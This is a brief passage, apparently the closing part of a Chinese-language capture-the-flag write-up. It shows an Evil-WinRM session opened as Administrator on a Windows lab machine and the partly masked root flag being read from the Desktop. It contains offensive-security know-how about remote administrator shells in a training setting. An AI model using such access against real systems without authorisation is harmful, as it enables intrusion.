Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

在 Desktop 目录中能找到 Root Flag：

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
058ad3**********************
```
